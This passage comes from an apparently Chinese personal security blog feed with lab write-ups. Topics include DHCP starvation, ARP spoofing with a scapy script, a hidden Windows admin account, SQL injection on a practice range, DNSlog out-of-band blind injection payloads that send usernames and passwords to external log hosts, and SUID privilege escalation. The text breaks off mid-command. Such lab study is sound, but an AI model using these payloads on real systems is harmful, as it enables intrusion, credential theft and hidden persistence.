class="code"><pre><span class="line">dhcp snooping user-bind</span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p><strong>DHCP Snooping 非信任接口发送的offer报文丢弃，但并无法防御申请，也就是饿死攻击</strong></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>原理：饿死攻击仅修改Ch?（M）addr，并不会修改源MAC地址</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>因此可以在接口上开启dhcp snooping 的 chaddr检测功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">交换机配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">port-group group-member g0/<span class="number">0</span>/<span class="number">1</span> to g0/<span class="number">0</span>/<span class="number">3</span></span><br><span class="line">dhcp snooping check dhcp-chaddr enable </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">dhcp服务器重置地址池</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reset ip pool name <span class="number">1</span> <span class="built_in">all</span></span><br></pre></td></tr></table></figure><p>此时已经不会出现被绑定的情况了，防御成功，未能到达服务器</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>discover报文仅仅出现在1口</p><p><img src="Untitled%2011.png" alt="Untitled"></p><h2 id="攻击二-修改MAC和Chaddr"><a href="#攻击二-修改MAC和Chaddr" class="headerlink" title="攻击二-修改MAC和Chaddr"></a>攻击二-修改MAC和Chaddr</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">虽然打不开图形界面，但是可以使用命令</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">yersinia dhcp -interface eth0 -attack <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2012.png" alt="Untitled"></p><p>发现出现了dhcp discover报文泛洪，并且MAC地址和chaddr都发生了改变</p><p><img src="Untitled%2013.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗</title>
      <link href="/2024/04/24/ARP%E6%AC%BA%E9%AA%97/"/>
      <url>/2024/04/24/ARP%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>准备一台kali虚拟机</li><li>一台win靶机</li></ul><h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>安装arpspoof工具</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof <span class="comment">#会提示安装，输入y安装</span></span><br></pre></td></tr></table></figure><h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><h3 id="kali"><a href="#kali" class="headerlink" title="kali:"></a>kali:</h3><p>使用nmap或fping判断存活主机</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span>.x.*</span><br><span class="line">fping -asg <span class="number">192.168</span>.x.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>在本地查看当前网关</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure><p>此时win虚拟机ping百度是可以ping通的</p><h3 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h3><p><img src="Untitled.png" alt="Untitled"></p><h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡[eth0] -t [目标ip] [网关]</span><br></pre></td></tr></table></figure><p><img src="Untitled%201.png" alt="Untitled1"></p><p>观察目标主机</p><h3 id="windows：-1"><a href="#windows：-1" class="headerlink" title="windows："></a>windows：</h3><p>已经ping不通百度了</p><p><img src="Untitled%202.png" alt="Untitled2"></p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>攻击机假冒局域网网关，致使主机上不了网</p><p>可以通过在攻击前后在windows上使用命令<code>arp -a</code>查看网关的MAC地址的变化</p><p>攻击前的网关的MAC就是网关的MAC地址</p><p>而攻击后的网关的MAC地址，即为攻击机的MAC地址</p><p>当执行断网攻击的时候，攻击机会冒充网关给靶机发送arp报文</p><p><img src="Untitled%203.png" alt="Untitled3"></p><h2 id="ARP欺骗（不断网）"><a href="#ARP欺骗（不断网）" class="headerlink" title="ARP欺骗（不断网）"></a>ARP欺骗（不断网）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/net/ipv4/ip_forward <span class="comment">#查看</span></span><br><span class="line">echo /proc/sys/net/ipv4/ip_forward <span class="comment">#开启ip转发功能</span></span><br><span class="line"><span class="number">1</span> <span class="comment">#转发 </span></span><br><span class="line"><span class="number">0</span> <span class="comment">#拦截</span></span><br></pre></td></tr></table></figure><h3 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a>欺骗攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i [网卡] -t [网关] [地址] </span><br></pre></td></tr></table></figure><p>此时就不会拦截</p><h2 id="ARP断网攻击（python脚本）"><a href="#ARP断网攻击（python脚本）" class="headerlink" title="ARP断网攻击（python脚本）"></a>ARP断网攻击（python脚本）</h2><h3 id="根据ARP报文格式分析各项参数"><a href="#根据ARP报文格式分析各项参数" class="headerlink" title="根据ARP报文格式分析各项参数"></a>根据ARP报文格式分析各项参数</h3><p>ARP报文</p><p><img src="Untitled%204.png" alt="Untitled4"></p><p>以太网帧头：</p><p>目的MAC地址（Dst）</p><p>源MAC地址（Src）</p><p><img src="Untitled%205.png" alt="Untitled5"></p><p>ARP报文：</p><p>操作类型（op）：0为ARP请求数据包，1为ARP应答数据包</p><p>源MAC地址（hwsrc）</p><p>源IP地址(psrc)</p><p>目的MAC地址(hwdst)</p><p>目的IP地址(pdst)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#ip</span></span><br><span class="line">target_ip=<span class="string">&#x27;192.168.60.108&#x27;</span></span><br><span class="line">local_ip=<span class="string">&#x27;192.168.60.79&#x27;</span></span><br><span class="line">gateway_ip=<span class="string">&#x27;192.168.60.254&#x27;</span></span><br><span class="line"><span class="comment">#mac</span></span><br><span class="line">target_mac=getmacbyip(target_ip)</span><br><span class="line">mac=get_if_hwaddr(<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line">gateway_mac=getmacbyip(gateway_ip)</span><br><span class="line"></span><br><span class="line">packet=Ether(dst=target_mac,src=mac)/ARP(op=<span class="number">1</span>,hwsrc=mac,</span><br><span class="line">psrc=gateway_ip,hwdst=target_mac,pdst=target_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sendp(packet,inter = <span class="number">2</span>,iface=<span class="string">&quot;eth0&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="Untitled%206.png" alt="Untitled6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码生成工具cupp和cewl安装</title>
      <link href="/2023/07/08/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/"/>
      <url>/2023/07/08/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p> 我们可以使用Cupp生成一份结合具体目标的带社工性质的字典，比如结合目标的手机号，姓名，生日等</p><p>下面我们就来安装</p><h2 id="Cupp的安装与使用"><a href="#Cupp的安装与使用" class="headerlink" title="Cupp的安装与使用"></a>Cupp的安装与使用</h2><p>使用命令:<code>apt-get install cupp</code></p><p><img src="密码生成工具cupp和cewl安装/image-20230708181324767.png" alt="image-20230708181324767"></p><p>查看命令 :<code>cupp</code></p><p><img src="密码生成工具cupp和cewl安装/image-20230708182835179.png" alt="image-20230708182835179"></p>]]></content>
      
      
      
        <tags>
            
            <tag> “工具安装” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis安装</title>
      <link href="/2023/05/31/redis%E5%AE%89%E8%A3%85/"/>
      <url>/2023/05/31/redis%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>最近想着复现一下redis系列的漏洞，自己先搭建个环境</p><p>我们来安装4.08版本</p><h2 id="redis-4-0-8的安装"><a href="#redis-4-0-8的安装" class="headerlink" title="redis-4.0.8的安装"></a>redis-4.0.8的安装</h2><p>下载地址：<a href="http://download.redis.io/releases/redis-4.0.8.tar.gz">http://download.redis.io/releases/redis-4.0.8.tar.gz</a></p><p>我们安装到我们的kali虚拟机上</p><p>使用命令<code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></p><p><img src="image-20230531185445705.png" alt="image-20230531185445705"></p><p>解压下载的redis-4.0.8.tar.gz文件，使用命令 <code>tar xvf redis-4.0.8.tar.gz</code></p><p><img src="image-20230531185608575.png" alt="image-20230531185608575"></p><p>进入解压文件夹redis-4.0.8，使用命令<code>make</code>编译可执行文件</p><p><img src="image-20230531185923394.png" alt="image-20230531185923394"></p><p>之后在此文件夹中使用命令 <code>redis-server redis.conf</code>来启动服务，如下图，默认端口为6379</p><p><img src="image-20230531221728358.png" alt="image-20230531221728358"></p><p>可以使用<code>ps -ef|grep redis</code>来查看redis服务是否开启</p><p><img src="image-20230531222119558.png" alt="image-20230531222119558"></p><h2 id="redis后台启动"><a href="#redis后台启动" class="headerlink" title="redis后台启动"></a>redis后台启动</h2><p>当然此时，redis服务是在前台运行，需要一直”挂着“才行，这里可以修改配置文件<code>redis.conf</code>，改为后端启动,将<code>daemonize no</code></p><p>改为<code>daemonize yes</code></p><p><img src="image-20230531222817197.png" alt="image-20230531222817197"></p><p>再次使用<code>redis-server redis.conf</code>命令启动</p><p><img src="image-20230531223214020.png" alt="image-20230531223214020"></p><p>使用<code>ps -aux|grep redis</code>查看是否启动成功，启动成功！</p><p><img src="image-20230531223306622.png" alt="image-20230531223306622"></p><p>redis自带客户端连接，使用命令 <code>redis-cli -h localhost -p 6379</code>来连接</p><p><img src="image-20230531223918025.png" alt="image-20230531223918025"></p><p>此时可以使用<code>shutdown</code>命令将服务关闭</p><p><img src="image-20230531224213179.png" alt="image-20230531224213179"></p><p>可以看到此时服务已经关闭。也可以使用关闭进程的方式关闭服务，使用<code>kill -9 [pid]</code>命令终结进程</p><p><img src="image-20230531224334207.png" alt="image-20230531224334207"></p><p>当然，此时是本地连接，自己连接自己，因为默认redis时只能本地连接的，所以下面我们来开启远程连接</p><h2 id="redis开启远程连接"><a href="#redis开启远程连接" class="headerlink" title="redis开启远程连接"></a>redis开启远程连接</h2><p>首先是使用ip连接，先查看ip地址<code>ifconfig</code></p><p><img src="image-20230531230542963.png" alt="image-20230531230542963"></p><p>依然是修改配置文件，<code>nano redis.conf</code>,将 <code>bind 127.0.0.1</code>改为<code>bind 192.168.31.135</code></p><p><img src="image-20230531230609044.png" alt="image-20230531230609044"></p><p>保存后重启redis服务（关闭+打开）,发现此时已经可以使用IP进行连接了</p><p><img src="image-20230531230711456.png" alt="image-20230531230711456"></p><p>此时要想让局域网内的其他主机连接，还需要将保护模式关闭，将<code>protected-mode yes</code>改为<code>protected-mode no</code> </p><p><img src="image-20230531224635071.png" alt="image-20230531224635071"></p><p>重启服务，此时通过另一台kali连接，连接成功</p><p><img src="image-20230531231050187.png" alt="image-20230531231050187"></p>]]></content>
      
      
      
        <tags>
            
            <tag> redis系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者在线靶场-SQL注入漏洞测试(参数加密)</title>
      <link href="/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/"/>
      <url>/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/</url>
      
        <content type="html"><![CDATA[<p><img src="image-20230529211827617.png" alt="image-20230529211827617"></p><p>之前面试有出过一个这个类似的，现在复现一下</p><p>访问链接，发现一个登陆页面</p><p><img src="image-20230529212201805.png" alt="image-20230529212201805"></p><p>先用dirsearch扫一下</p><p><img src="image-20230529213056045.png" alt="image-20230529213056045"></p><p>挨个查看，最后发现news目录下的东西有些可疑</p><p><img src="image-20230529213157805.png" alt="image-20230529213157805"></p><p>下载zip文件，可以看到list.php的源码</p><p><img src="image-20230529213532178.png" alt="image-20230529213532178"></p><p>主要看php里的内容就好了，主要意思就是，list.php通过get请求获取一个id，并对其进行decode<br>decode函数里的内容就是，将参数data经过两次base64解密，然后经过mdecrypt_generic函数操作（通过英文可以大概知道是用来解密的函数），如果后六位是_mozhe就会返回除去 _mozhe的剩余部分，也就是接入sql语句。</p><p>目的也就明确了，就是sql盲注嘛，首先要搞清楚mcrypt_generic_init中几个参数的含义（应该就是对应的加密规则）</p><p>aes在线工具：<a href="https://oktools.net/aes">AES加密、AES解密 - 在线工具 - OKTools</a></p><p>通过搜索发现是使用的AES加密，ydhaqPQnexoaDuW3是密钥，2018201920202021是参数。那么我们就先使用1_mozhe进行测试去进行aes加密+base64加密（这里使用的工具结果是经过一次base64加密的），这样根据php源码，如果对应上了，页面就不会跳转，而且应该会有数据，如果错了就会跳转到index.php页面</p><p>payload：<code>/news/list.php?id=WDhGNGdmdGo4WXArSXhMOXlVa2FwQT09</code></p><p>果然显示出了通知，接下来就开始sql注入了</p><p><img src="image-20230529232424956.png" alt="image-20230529232424956"></p><p>测试字段数量</p><p><img src="image-20230529232730372.png" alt="image-20230529232730372"></p><p><strong><em><u>ps：上述图片结果记得再加密一次base64</u></em></strong></p><p><img src="image-20230529232805945.png" alt="image-20230529232805945"></p><p>最终测试字段数为4，下图是order by 5时的报错（虽然从源码里也能看到是4个字段，做完才想起来）</p><p><img src="image-20230529233232099.png" alt="image-20230529233232099"></p><p>测试4个字段哪一个有回显</p><p><img src="image-20230529235229938.png" alt="image-20230529235229938"></p><p>发现2，3有回显</p><p><img src="image-20230529235310954.png" alt="image-20230529235310954"></p><p>爆破数据库名</p><p><img src="image-20230529235412852.png" alt="image-20230529235412852"></p><p>爆破表名</p><p><img src="image-20230529235547054.png" alt="image-20230529235547054"></p><p>估计用户就在第一个表里，爆破字段</p><p><img src="image-20230529235736792.png" alt="image-20230529235736792"></p><p>爆破用户名密码，得到两个账号，应该说是两个密码？？</p><p><img src="image-20230530000016518.png" alt="image-20230530000016518"></p><p><img src="image-20230529235917643.png" alt="image-20230529235917643"></p><p>密码看起来都是md5加密，破解一下，应该只有一个能被破解出来，试试看</p><p>md5线上工具：<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><p>结果发现两个都解出来了。。。</p><p><img src="image-20230530000322178.png" alt="image-20230530000322178"></p><p><img src="image-20230530000348852.png" alt="image-20230530000348852"></p><p>登录账号，果然虽然两个密码都解出来了，dsan13这个是不能用的，阴险~</p><p><img src="image-20230530000714187.png" alt="image-20230530000714187"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 隐藏账户排查</title>
      <link href="/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p> 首先创建隐藏账户</p><p><img src="image-20230426094828847.png" alt="image-20230426094828847"></p><p>此时使用net user并不能发现用户admin$</p><p><img src="image-20230426094935044.png" alt="image-20230426094935044"></p><p>将admin$用户加入administrators组,使用命令<code>net localgroup administrators admin$ /add</code></p><p><img src="image-20230426095217121.png" alt="image-20230426095217121"></p><p>此时admin$用net user是查看不到的，但查看用户和组的时候还是可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看命令：net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><p><img src="image-20230426095351178.png" alt="image-20230426095351178"></p><p>所以需要修改注册表，<code>win+r</code>输入<code>regedit</code>进入注册表</p><p>进入到以下目录<code>HKEY_LOCAL_MACHINE/SAM/SAM</code></p><p><img src="image-20230426095830511.png" alt="image-20230426095830511"></p><p>右击，将权限转交给administrator</p><p><img src="image-20230426100057239.png" alt="image-20230426100057239"></p><p>此时可以看到admin$，并发现其类型为0x3e9</p><p><img src="image-20230426100549678.png" alt="image-20230426100549678"></p><p>,而administrator的类型为0x1f4</p><p><img src="image-20230426100517607.png" alt="image-20230426100517607"></p><p>将admin$,000003E9,000001F4导出</p><p><img src="image-20230426100917742.png" alt="image-20230426100917742"></p><p><img src="image-20230426101048111.png" alt="image-20230426101048111"></p><p>将1f4中的F值复制给3e9</p><p><img src="image-20230426101151369.png" alt="image-20230426101151369"></p><p>复制完之后，就回去把admin$给删掉，命令net user admin$ /del</p><p><img src="image-20230426101513323.png" alt="image-20230426101513323"></p><p>然后回到注册表，将admin.reg 和 admin3e9.reg导入</p><p><img src="image-20230426101856446.png" alt="image-20230426101856446"></p><p>导入成功</p><p><img src="image-20230426102135314.png" alt="image-20230426102135314"></p><p>然后回去，将赋予administrator的权限回收</p><p><img src="image-20230426144717925.png" alt="image-20230426144717925"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 隐藏账户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注快速获取数据</title>
      <link href="/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！</p><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>我们使用sql-labs进行还原盲注的情形，就用Less-9吧</p><p><img src="image-20230415195258997.png" alt="image-20230415195258997"></p><p>可以看到经过简单的注入点测试，发现页面上的东西不会发生改变</p><p><img src="image-20230415195831443.png" alt="image-20230415195831443"></p><p>但是当payload为请求时间大概为6.02秒，说明存在注入点</p><p><img src="image-20230415200036995.png" alt="image-20230415200036995"></p><p>此时我们需要一个dns平台，就使用ceye平台自带的吧 <a href="http://ceye.io/">http://ceye.io/</a></p><p>或者是其他dns平台，比如<a href="http://www.dnslog.cn/">dnslog</a></p><p>这两个这里都会演示一下</p><p><img src="image-20230415201655811.png" alt="image-20230415201655811"></p><h2 id="dnslog外带条件"><a href="#dnslog外带条件" class="headerlink" title="dnslog外带条件"></a>dnslog外带条件</h2><p>要使用dnslog外带首先需要满足几个条件：</p><p>1.首先要将secure_file_priv改为‘’</p><p><img src="image-20230417111707360.png" alt="image-20230417111707360"></p><blockquote><p>​    修改步骤：1.使用show variables like ‘%secure%’</p><p>​                        2.进入MYSQL文件夹下，打开my.ini文件</p><p>​                        3.在my.ini中，添加或修改为secure_file_priv=””</p></blockquote><p><img src="image-20230417112144072.png" alt="修改后的secure_file_priv"></p><p>2，只适用于Windows系统</p><h2 id="DNS外带实践"><a href="#DNS外带实践" class="headerlink" title="DNS外带实践"></a>DNS外带实践</h2><p><code>payload：?id=1&#39;  and sleep(5) order by 3--+</code></p><p>判断字段数，在order by 3时会sleep的，order by 4 时并不会sleep</p><p><img src="image-20230415202943458.png" alt="image-20230415202943458"></p><p>测试出查询字段数为3</p><p><code>payload：?id=1&#39;  and sleep(5) union select 1,2,3--+</code></p><p><img src="image-20230415203036163.png" alt="image-20230415203036163"></p><p>测试是否支持dns外带，使用的ceye给的dns地址</p><p><code>payload：/?id=1&#39; and load_file(&#39;\\\\nihao.xxxx.ceye.io\\abc&#39;) --+</code></p><p><img src="image-20230417113400272.png" alt="image-20230417113400272"></p><p>外带成功：</p><p><img src="image-20230417113527467.png" alt="image-20230417113527467"></p><p><strong><em>（ps：后面就是用dnslog平台来进行演示了）</em></strong></p><p>获取一个域名先</p><p><img src="image-20230417143912645.png" alt="image-20230417143912645"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,database(),&#39;.fh0qvo.dnslog.cn\\abc&#39;)) --+</code></p><p>外带数据库名称</p><p><img src="image-20230417114432264.png" alt="image-20230417114432264"></p><p>在dnslog平台得到数据库名称security：</p><p><img src="image-20230417114711489.png" alt="image-20230417114711489"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破表名</p><p><img src="image-20230417145128446.png" alt="image-20230417145128446"></p><p>通过改变limit后的数字得到所有的表名</p><p>limit 0,1:</p><p><img src="image-20230417145045963.png" alt="image-20230417145045963"></p><p>limit 1,1:</p><p><img src="image-20230417145325600.png" alt="image-20230417145325600"></p><p>limit 2,1:</p><p><img src="image-20230417145434505.png" alt="image-20230417145434505"></p><p>……</p><p><img src="image-20230417145511479.png" alt="image-20230417145511479"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破字段名</p><p><img src="image-20230417145650444.png" alt="image-20230417145650444"></p><p><img src="image-20230417145602648.png" alt="image-20230417145602648"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(username,password) from users limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破用户名和密码</p><p><img src="image-20230417150509236.png" alt="image-20230417150509236"></p><p><img src="image-20230417150347739.png" alt="image-20230417150347739"></p><p>虽然还是慢了些，但比起纯手工还是好了些，另外还可以结合脚本利用，这里就不过多赘述了，有机会再详细讲述。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUID提权</title>
      <link href="/2023/03/21/SUID%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/21/SUID%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>接上文sudo滥用提权，今天我们来学习suid提权</p><h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>suid是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行</p><p>这里就不得不再提一次关于Linux文件权限的理解：</p><blockquote><p>​    Linux中每个文件和目录都有九位基础权限位，每三位组成一组分别为：<strong>文件类型，属主用户权限位，用户组权限位，其它用户权限</strong></p><p>类似这样：d<strong>rwxrwxrwx</strong>（加粗部分，第一位d为目录文件），其中</p><p>r为可读权限，对应数字4</p><p>w为可写权限，对应数字2 </p><p>x为可执行权限，对应数字1</p><p>若没有以上权限则可用-代替，对应数字0</p><p>接下来就是我们今天要讲的suid位，当s出现在属主权限位的x权限位上时，就被称为Set UID 简称SUID</p><p>suid s对应数字4</p></blockquote><p>s出现在属主权限x位上的作用：</p><blockquote><p>1.SUID权限仅对二进制程序有效</p><p>2.执行者对于该文件需要有x（运行）权限</p><p>3.本权限仅在程序运行过程中有效</p><p>4.执行者将拥有文件所有者的权限</p></blockquote><p>所以SUID提权的思路就是我们运行root用户所拥有的文件，那么我们运行该文件的时候就拥有root权限了，有点相似sudo滥用提权，都是利用拥有root权限的命令/程序，运行相应的最后获取root权限。下面进行环境的搭建</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>现在我们就来复现一下使文件变为具有root权限的suid的文件，首先编辑一个test.c</p><p><img src="image-20230323215718909.png" alt="image-20230323215718909"></p><p><img src="image-20230323221433451.png" alt="image-20230323221433451"></p><p>使用命令<code>gcc test.c -o 1</code>编译一下，编译为文件1</p><p><img src="image-20230323215817143.png" alt="image-20230323215817143"></p><p>设置文件的suid，注意这里要执行用户需要拥有运行权限，也就是其他用户权限要有x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la //查看文件权限</span><br><span class="line">chmod 4775 1//4给文件1增添suid</span><br></pre></td></tr></table></figure><p>再次查看文件权限发现文件名已经变红了</p><p><img src="image-20230323220030036.png" alt="image-20230323220030036"></p><p>可以使用以下命令查看具有SUID权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><code>find</code>: 在文件系统中查找文件和目录。</li><li><code>/</code>: 搜索的起始目录是根目录。</li><li><code>-perm</code>: 权限匹配选项，用于指定要搜索的文件权限。</li><li><code>-u=s</code>: 表示要搜索的权限是用户的 SetUID 权限，即文件所有者的权限。</li><li><code>-type f</code>: 指定要搜索的对象是文件（不包括目录）。</li><li><code>2&gt;/dev/null</code>: 将标准错误输出重定向到 /dev/null，这样可以忽略权限不足或找不到文件的错误信息。</li></ul><p><img src="image-20230323220653196.png" alt="image-20230323220653196"></p><p>可以看到/tmp/1就在其中</p><p><img src="image-20230323220708357.png" alt="image-20230323220708357"></p><p>使用非root用户，运行1，发现<code>cat /etc/shadow</code>运行成功，说明此时1运行时就是root权限，接下来就是提权的利用</p><h2 id="提权的利用"><a href="#提权的利用" class="headerlink" title="提权的利用"></a>提权的利用</h2><p>已知的可以用来提权的linux可行性文件列表如下：</p><blockquote><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul></blockquote><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>就先拿find来说</p><p>先将find增加SUID权限，原本为755权限，现在改为4755,使用命令<code>chmod 4755 /bin/find</code></p><p><img src="image-20230323232843890.png" alt="image-20230323232843890"></p><p>当find文件拥有SUID权限时，通过find执行的所有命令都会以root权限执行如下：</p><p>使用非root用户执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 1 -exec whoami \;</span><br></pre></td></tr></table></figure><p>未拥有SUID权限时：</p><p><img src="image-20230323233811760.png" alt="image-20230323233811760"></p><p>拥有SUID权限时：</p><p><img src="image-20230323233647653.png" alt="image-20230323233647653"></p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>这次我们用另一种方式给vim命令赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s /usr/bin/vim </span><br></pre></td></tr></table></figure><p>依然可以用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>来查看是否已经拥有SUID权限</p><p>这里是将vim复制为了.vim</p><p><img src="image-20240507105836401.png" alt="image-20240507105836401"></p><p>此时切换非root用户时，使用.vim命令新建一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/.vim 